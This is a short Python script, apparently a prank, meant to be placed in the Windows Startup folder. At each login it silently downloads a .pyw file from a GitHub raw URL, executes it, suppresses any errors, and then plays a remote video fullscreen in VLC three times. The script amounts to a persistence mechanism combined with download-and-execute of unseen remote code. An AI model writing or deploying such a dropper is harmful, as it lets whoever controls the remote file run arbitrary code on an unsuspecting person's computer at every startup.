# Copy this to %appdata%\Microsoft\Windows\Start Menu\Programs\Startup

import sys, subprocess, urllib.request, os

ricpath = os.path.expanduser("~") + "\\ric.pyw"

try:
    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric.pyw", ricpath)
except Exception:
    pass

try:
    subprocess.run([sys.executable, ricpath], shell=False)
except Exception:
    pass

for i in range(3): subprocess.run(["C:\\Program Files\\VideoLAN\\VLC\\VLC.exe", "--fullscreen", "https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric.mp4"], shell=False)
